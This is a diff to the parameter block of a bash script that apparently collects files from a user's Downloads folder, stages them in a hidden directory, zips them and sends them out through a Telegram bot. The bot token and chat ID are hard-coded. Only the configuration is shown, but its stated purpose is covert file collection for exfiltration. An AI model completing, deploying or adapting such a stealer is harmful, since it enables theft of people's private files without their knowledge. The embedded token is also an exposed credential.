@@ -1,10 +1,9 @@
-
 #!/bin/bash
 
 # Customizable Parameters
 TELEGRAM_BOT_TOKEN="7773792784:AAFfeZfSjo3yVYIbUPA1xwlMK17l-Fak2sg"  # Replace with your bot token
 TELEGRAM_CHAT_ID="1318817377"               # Replace with your chat ID
-TARGET_DIRECTORY="$HOME/Desktop"              # Replace with the directory to collect files from
+TARGET_DIRECTORY="$HOME/mainos/Downloads"              # Replace with the directory to collect files from
 HIDDEN_DIRECTORY="$HOME/.hidden_folder"       # Hidden directory path
 ZIP_FILE="$HOME/collected_data.zip"           # Temporary ZIP file path
 
